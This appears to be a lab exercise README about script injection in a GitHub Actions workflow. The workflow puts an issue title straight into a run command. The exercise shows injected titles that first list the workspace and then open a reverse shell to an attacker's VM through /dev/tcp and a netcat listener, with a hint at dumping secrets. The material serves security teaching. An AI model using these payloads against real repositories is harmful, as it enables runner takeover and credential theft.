# Exercise 1 - Script injection in the run command
The [Check issue title](.github/workflows/check-issue-title.yml) workflow uses the issue title in the `run` command as follows:
```
title="${{ github.event.issue.title }}"
```
This provides an opportunity for an attacker to exploit the workflow with an issue titled `octocat"; ls -l $GITHUB_WORKSPACE"`. Using this title, the script looks like the following...
```
title="octocat"; ls -l $GITHUB_WORKSPACE"
```

Let's create a new issue with this title and see what happens. We observe that the workflow runs the command `ls -l $GITHUB_WORKSPACE`!  

<img width="1042" alt="Screenshot 2023-08-30 at 7 38 43 PM" src="https://github.com/robandpdx/workflow-script-injection/assets/95243761/e3fa3917-2834-45cc-a297-d25614c3185e">

Ok. Big deal. So we were able to see what is in the workspace directory. Who cares?  
Now let's try something a little more sinister...  
Spin up a linux vm in the cloud that has a public IP address. Login and run `nc -nvlp 1337`. Then open a new issue with the title `octocat"; bash -i >& /dev/tcp/<YOUR-VM-IP-ADDRESS>/1337 0>&1 ; ls -l $GITHUB_WORKSPACE"`  

Now I have a shell on the runner! This is a great "foot in the door" from which I can attemp other exploits, like dumping secrets or cloud credentials to use in other attacks.  